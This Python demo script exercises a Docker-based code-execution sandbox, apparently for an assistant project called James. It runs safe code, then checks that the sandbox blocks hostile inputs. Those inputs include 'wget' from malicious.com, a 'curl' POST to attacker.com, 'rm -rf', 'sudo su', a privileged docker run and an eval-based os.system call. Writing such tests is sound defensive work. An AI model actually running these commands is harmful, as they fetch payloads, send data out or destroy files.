#!/usr/bin/env python3
"""
Demo script for the secure sandbox environment.

This script demonstrates the capabilities and security features
of the Docker-based sandbox for code execution.
"""

import asyncio
import logging
import sys
from pathlib import Path

# Add backend to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from backend.sandbox import SecureSandbox, SandboxConfig, SandboxError

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


async def demo_safe_python_execution():
    """Demo safe Python code execution."""
    print("\n=== Demo: Safe Python Code Execution ===")
    
    sandbox = SecureSandbox()
    
    safe_code = """
# Safe Python code
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

# Calculate first 10 Fibonacci numbers
fib_numbers = [fibonacci(i) for i in range(10)]
print(f"First 10 Fibonacci numbers: {fib_numbers}")

# Simple math operations
result = sum(fib_numbers)
print(f"Sum of Fibonacci numbers: {result}")
"""
    
    try:
        result = await sandbox.execute_code(safe_code, "python")
        
        print(f"✅ Execution successful: {result.success}")
        print(f"📊 Exit code: {result.exit_code}")
        print(f"⏱️  Execution time: {result.execution_time:.2f}s")
        print(f"📝 Output:\n{result.stdout}")
        
        if result.resource_usage:
            print(f"💾 Memory usage: {result.resource_usage.get('memory_usage', 'N/A')}")
        
    except Exception as e:
        print(f"❌ Error: {e}")


async def demo_safe_terminal_commands():
    """Demo safe terminal command execution."""
    print("\n=== Demo: Safe Terminal Commands ===")
    
    sandbox = SecureSandbox()
    
    safe_commands = [
        "echo 'Hello from sandbox!'",
        "ls -la /sandbox",
        "pwd",
        "whoami",
        "date",
    ]
    
    for command in safe_commands:
        print(f"\n🔧 Executing: {command}")
        try:
            result = await sandbox.execute_terminal_command(command)
            
            if result.success:
                print(f"✅ Success: {result.stdout.strip()}")
            else:
                print(f"❌ Failed: {result.stderr.strip()}")
                
        except Exception as e:
            print(f"❌ Error: {e}")


async def demo_james_directory_access():
    """Demo James directory access."""
    print("\n=== Demo: James Directory Access ===")
    
    sandbox = SecureSandbox()
    
    james_code = """
import os
import json
from datetime import datetime

# Create a test directory in James folder
test_dir = "/james/sandbox_test"
os.makedirs(test_dir, exist_ok=True)

# Write some test data
test_data = {
    "timestamp": datetime.now().isoformat(),
    "message": "Hello from secure sandbox!",
    "test_results": [1, 2, 3, 4, 5]
}

with open(f"{test_dir}/test_data.json", "w") as f:
    json.dump(test_data, f, indent=2)

print(f"✅ Created test file in {test_dir}")

# Read it back
with open(f"{test_dir}/test_data.json", "r") as f:
    loaded_data = json.load(f)

print(f"📖 Read back data: {loaded_data['message']}")
print(f"🕐 Timestamp: {loaded_data['timestamp']}")
"""
    
    try:
        result = await sandbox.execute_code(james_code, "python")
        
        if result.success:
            print("✅ James directory access successful!")
            print(f"📝 Output:\n{result.stdout}")
        else:
            print(f"❌ Failed: {result.stderr}")
            
    except Exception as e:
        print(f"❌ Error: {e}")


async def demo_security_violations():
    """Demo security violation detection."""
    print("\n=== Demo: Security Violation Detection ===")
    
    sandbox = SecureSandbox()
    
    dangerous_codes = [
        ("File system access", "import os; os.listdir('/')"),
        ("Network access", "import urllib; urllib.request.urlopen('http://google.com')"),
        ("Subprocess execution", "import subprocess; subprocess.run(['ls', '/'])"),
        ("Code evaluation", "eval('__import__(\"os\").system(\"ls\")')"),
        ("System access", "import sys; sys.exit(1)"),
    ]
    
    for description, code in dangerous_codes:
        print(f"\n🚨 Testing: {description}")
        print(f"   Code: {code}")
        
        try:
            result = await sandbox.execute_code(code, "python")
            
            if result.success:
                print("⚠️  Unexpectedly succeeded - security issue!")
            else:
                print("✅ Correctly blocked dangerous code")
                print(f"   Reason: {result.stderr}")
                
        except Exception as e:
            print(f"✅ Security violation detected: {e}")


async def demo_dangerous_terminal_commands():
    """Demo dangerous terminal command detection."""
    print("\n=== Demo: Dangerous Terminal Command Detection ===")
    
    sandbox = SecureSandbox()
    
    dangerous_commands = [
        "rm -rf /tmp",
        "sudo su",
        "wget http://malicious.com/script",
        "curl -X POST http://attacker.com/data",
        "ssh user@remote-host",
        "docker run --privileged malicious-image",
    ]
    
    for command in dangerous_commands:
        print(f"\n🚨 Testing dangerous command: {command}")
        
        try:
            result = await sandbox.execute_terminal_command(command)
            
            if result.success:
                print("⚠️  Unexpectedly succeeded - security issue!")
            else:
                print("✅ Correctly blocked dangerous command")
                
        except Exception as e:
            print(f"✅ Security violation detected: {e}")


async def demo_resource_limits():
    """Demo resource limit enforcement."""
    print("\n=== Demo: Resource Limit Enforcement ===")
    
    # Create sandbox with strict limits
    config = SandboxConfig(
        memory_limit="100m",  # Low memory limit
        timeout_seconds=5,    # Short timeout
        cpu_limit=0.3        # Limited CPU
    )
    sandbox = SecureSandbox(config)
    
    print(f"🔧 Sandbox limits:")
    print(f"   Memory: {config.memory_limit}")
    print(f"   Timeout: {config.timeout_seconds}s")
    print(f"   CPU: {config.cpu_limit} cores")
    
    # Test timeout
    print("\n⏱️  Testing timeout with infinite loop...")
    timeout_code = """
import time
print("Starting infinite loop...")
while True:
    time.sleep(0.1)
    print("Still running...")
"""
    
    try:
        result = await sandbox.execute_code(timeout_code, "python")
        
        if result.success:
            print("⚠️  Code completed unexpectedly")
        else:
            print("✅ Timeout enforced successfully")
            print(f"   Execution time: {result.execution_time:.2f}s")
            
    except Exception as e:
        print(f"✅ Resource limit enforced: {e}")


async def demo_custom_configuration():
    """Demo custom sandbox configuration."""
    print("\n=== Demo: Custom Sandbox Configuration ===")
    
    # Custom configuration for specific use case
    custom_config = SandboxConfig(
        memory_limit="256m",
        cpu_limit=0.8,
        timeout_seconds=15,
        base_image="python:3.11-slim",
        james_dir="~/.james",
        temp_dir_size="50m"
    )
    
    print(f"🔧 Custom configuration:")
    print(f"   Memory limit: {custom_config.memory_limit}")
    print(f"   CPU limit: {custom_config.cpu_limit}")
    print(f"   Timeout: {custom_config.timeout_seconds}s")
    print(f"   Base image: {custom_config.base_image}")
    print(f"   James directory: {custom_config.james_dir}")
    print(f"   Temp directory size: {custom_config.temp_dir_size}")
    
    sandbox = SecureSandbox(custom_config)
    
    # Test with custom configuration
    test_code = """
import platform
import sys

print(f"Python version: {sys.version}")
print(f"Platform: {platform.platform()}")
print(f"Architecture: {platform.architecture()}")

# Test memory usage
data = []
for i in range(1000):
    data.append(f"Item {i}" * 100)

print(f"Created {len(data)} items in memory")
print("Custom configuration test completed!")
"""
    
    try:
        result = await sandbox.execute_code(test_code, "python")
        
        if result.success:
            print("✅ Custom configuration working!")
            print(f"📝 Output:\n{result.stdout}")
        else:
            print(f"❌ Failed: {result.stderr}")
            
    except Exception as e:
        print(f"❌ Error: {e}")


async def main():
    """Run all sandbox demos."""
    print("🚀 Secure Sandbox Demo")
    print("=" * 50)
    
    try:
        # Check if Docker is available
        test_sandbox = SecureSandbox()
        print("✅ Docker is available and sandbox is ready!")
        
        # Run demos
        await demo_safe_python_execution()
        await demo_safe_terminal_commands()
        await demo_james_directory_access()
        await demo_security_violations()
        await demo_dangerous_terminal_commands()
        await demo_resource_limits()
        await demo_custom_configuration()
        
        print("\n🎉 All demos completed!")
        print("\n📋 Summary:")
        print("   ✅ Safe code execution works")
        print("   ✅ Security violations are detected")
        print("   ✅ Resource limits are enforced")
        print("   ✅ James directory access is controlled")
        print("   ✅ Custom configurations are supported")
        
    except SandboxError as e:
        print(f"❌ Sandbox error: {e}")
        print("\n💡 Make sure Docker is installed and running:")
        print("   - Install Docker Desktop or Docker Engine")
        print("   - Start the Docker service")
        print("   - Pull the base image: docker pull python:3.11-slim")
        
    except Exception as e:
        print(f"❌ Unexpected error: {e}")


if __name__ == "__main__":
    asyncio.run(main())